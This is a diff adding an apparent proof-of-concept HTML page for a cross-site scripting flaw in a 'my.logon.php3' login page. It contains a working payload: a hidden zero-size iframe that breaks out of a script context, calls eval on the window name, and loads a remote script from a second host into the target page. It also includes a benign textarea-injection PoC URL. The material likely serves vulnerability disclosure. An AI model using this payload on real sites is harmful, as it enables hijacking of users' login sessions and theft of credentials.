@@ -1,0 +1,17 @@
+&lt;html&gt;
+
+&lt;iframe src=&quot;https://www.example.com/my.logon.php3?%22%3E%3C/script%3E%3Cscript%3Eeval%28name%29%3C/script%3E%3C%21--&quot; width=&quot;0%&quot; height=&quot;0%&quot; name=&quot;xss=document.body.appendChild(document.createElement(&#039;script&#039;));xss.setAttribute(&#039;src&#039;,&#039;http://www.example2.com/b&#039;)&quot;&gt;&lt;/iframe&gt;
+
+&lt;/html&gt;
+
+-----------------------------------------------
+
+Proof of concept (PoC) URL:
+
+https://www.example.com/my.logon.php3?&quot;&gt;&lt;/script&gt;&lt;textarea&gt;HTML_injection_test&lt;/textarea&gt;&lt;!--
+
+The payload in the example is 
+
+&quot;&gt;&lt;/script&gt;&lt;textarea&gt;HTML_injection_test&lt;/textarea&gt;&lt;!--
+
+which injects a &#039;textarea&#039; box
